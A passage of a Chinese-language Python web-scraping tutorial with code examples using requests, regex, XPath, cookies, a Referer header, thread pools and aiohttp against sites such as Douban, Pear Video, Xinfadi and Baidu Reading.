punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rating_num<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v:average<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>9.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>v:best<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2428154人评价<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inq<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>希望让人自由。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1291546/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>霸王别姬<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2561716440.webp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">import</span> timeheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">requ</span><span class="token punctuation">(</span>para<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>para<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    content <span class="token operator">=</span> resp<span class="token punctuation">.</span>text    recompile <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img width="100".*?&lt;span class="title">(?P&lt;name>.*?)&lt;/span>'</span>                           <span class="token string">r'.*?&lt;br>(?P&lt;year>.*?)&amp;nbsp.*?property="v:average">(?P&lt;sore>.*?)&lt;/span>'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    res <span class="token operator">=</span> recompile<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"->"</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"year"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" -- "</span> <span class="token operator">+</span> i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"sore"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://movie.douban.com/top250?start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">&#125;</span></span><span class="token string">&amp;filter='</span></span>        requ<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意每次要延时0.5s，以防请求过快</p></blockquote><h2 id="Xpath解析HTML-抓取猪八戒官网"><a href="#Xpath解析HTML-抓取猪八戒官网" class="headerlink" title="Xpath解析HTML + 抓取猪八戒官网"></a>Xpath解析HTML + 抓取猪八戒官网</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;book>    &lt;id>1&lt;/id>    &lt;name>野花遍地香&lt;/name>    &lt;price>1.23&lt;/price>    &lt;author>        &lt;nick id="100">jay&lt;/nick>        &lt;nick id="101">tom&lt;/nick>        &lt;nick class="jolin">jolin&lt;/nick>        &lt;nick class="alice">alice&lt;/nick>        &lt;div>            &lt;nick>aa&lt;/nick>        &lt;/div>        &lt;div>            &lt;nick>bb&lt;/nick>            &lt;div>            &lt;nick>cc&lt;/nick>            &lt;/div>        &lt;/div>        &lt;span>            &lt;nick>ss&lt;/nick>                    &lt;/span>    &lt;/author>&lt;/book>"""</span>tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/name/text()"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author/nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['jay', 'tom', 'jolin', 'alice']</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author//nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['jay', 'tom', 'jolin', 'alice', 'aa', 'bb', 'cc']</span>result <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/book/author/*/nick/text()"</span><span class="token punctuation">)</span>  <span class="token comment"># ['aa', 'bb', 'ss']</span><span class="token comment"># '//'代表所有nick节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://beijing.zbj.com/search/f/?type=new&amp;kw=saas"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>divs <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/html/body/div[6]/div/div/div[2]/div[4]/div[1]/div"</span><span class="token punctuation">)</span><span class="token keyword">for</span> div <span class="token keyword">in</span> divs<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        price <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[2]/div[2]/div[1]/span[1]/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"¥"</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token string">"saas"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[2]/div[2]/div[2]/p/text()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        company <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[1]/div[1]/p/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        address <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[1]/div[1]/div/span/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>price<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>company<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>address<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span>resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="requests库使用Cookie"><a href="#requests库使用Cookie" class="headerlink" title="requests库使用Cookie"></a><code>requests</code>库使用Cookie</h2><h5 id="使用session"><a href="#使用session" class="headerlink" title="使用session"></a>使用session</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"loginName"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"https://passport.17k.com/ck/user/login"</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防盗链-抓取梨视频"><a href="#防盗链-抓取梨视频" class="headerlink" title="防盗链 - 抓取梨视频"></a>防盗链 - 抓取梨视频</h2><p>梨视频的视频链接是在XHR中抓取到（<code>https://video.pearvideo.com/mp4/adshort/20210820/1629541188301-15751458_adpkg-ad_hd.mp4</code>）</p><p>并且被二次加工为</p><p>（<code>https://video.pearvideo.com/mp4/adshort/20210820/cont-1739559-15751458_adpkg-ad_hd.mp4</code>）</p><blockquote><p>即<code>1629541188301</code> 被加工成<code>cont-1739559</code></p></blockquote><p>使用<code>requests</code>请求之后发现存在防盗链，需要在请求头里加入<code>Referer</code>字段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"https://pearvideo.com/video_1739559"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"https://pearvideo.com/video_1739559"</span>contId <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>video_status <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://pearvideo.com/videoStatus.jsp?contId=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>contId<span class="token punctuation">&#125;</span></span><span class="token string">&amp;mrd=0.2949276285579938"</span></span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>video_status<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>js <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>systemTime <span class="token operator">=</span> js<span class="token punctuation">[</span><span class="token string">'systemTime'</span><span class="token punctuation">]</span>srcUrl <span class="token operator">=</span> js<span class="token punctuation">[</span><span class="token string">'videoInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'videos'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'srcUrl'</span><span class="token punctuation">]</span>srcUrl <span class="token operator">=</span> srcUrl<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>systemTime<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"cont-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>contId<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"a.mp4"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>srcUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程池爬取新发地"><a href="#线程池爬取新发地" class="headerlink" title="线程池爬取新发地"></a>线程池爬取新发地</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> ProcessPoolExecutor<span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">down_one_page</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> dat<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>dat<span class="token punctuation">)</span>    page_data <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> page_data<span class="token punctuation">:</span>        prodName <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'prodName'</span><span class="token punctuation">]</span>        lowPrice <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'lowPrice'</span><span class="token punctuation">]</span>        highPrice <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'highPrice'</span><span class="token punctuation">]</span>        place <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'place'</span><span class="token punctuation">]</span>        unitInfo <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'unitInfo'</span><span class="token punctuation">]</span>        specInfo <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'specInfo'</span><span class="token punctuation">]</span>        pubDate <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'pubDate'</span><span class="token punctuation">]</span>        write_file <span class="token operator">=</span> prodName<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>lowPrice<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>highPrice<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>place<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>unitInfo<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>specInfo<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>pubDate<span class="token operator">+</span><span class="token string">"\n"</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xinfadi.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>write_file<span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"limit"</span><span class="token punctuation">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span>            <span class="token string">"current"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">as</span> t<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"limit"</span><span class="token punctuation">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span>                <span class="token string">"current"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token punctuation">&#125;</span>            t<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>down_one_page<span class="token punctuation">,</span> <span class="token string">"http://www.xinfadi.com.cn/getPriceData.html"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="aiohttp异步爬取整本小说"><a href="#aiohttp异步爬取整本小说" class="headerlink" title="aiohttp异步爬取整本小说"></a>aiohttp异步爬取整本小说</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> asyncio<span class="token keyword">import</span> aiohttp<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> aiofiles<span class="token comment"># https://dushu.baidu.com/api/pc/getCatalog?data=&#123;"book_id":"4306063500"&#125;</span><span class="token comment"># https://dushu.baidu.com/api/pc/getChapterContent?data=&#123;"book_id":"4306063500","cid":"4306063500|11348579","need_bookinfo":1&#125;</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">down</span><span class="token punctuation">(</span>cid<span class="token punctuation">,</span> bid<span class="token punctuation">,</span> title<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"book_id"</span><span class="token punctuation">:</span> bid<span class="token punctuation">,</span>        <span class="token string">"cid"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>bid<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cid<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token string">"need_bookinfo"</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://dushu.baidu.com/api/pc/getChapterContent?data=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> resp<span class="token punctuation">:</span>            dic <span class="token operator">=</span> <span class="token keyword">await</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> aiofiles<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'novel/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>title<span class="token punctuation">&#125;</span></span><span class="token string">.txt'</span></span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                <span class="token keyword">await</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>dic<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'novel'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getCatalog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    dic <span class="token operator">=</span> resp<span class="token 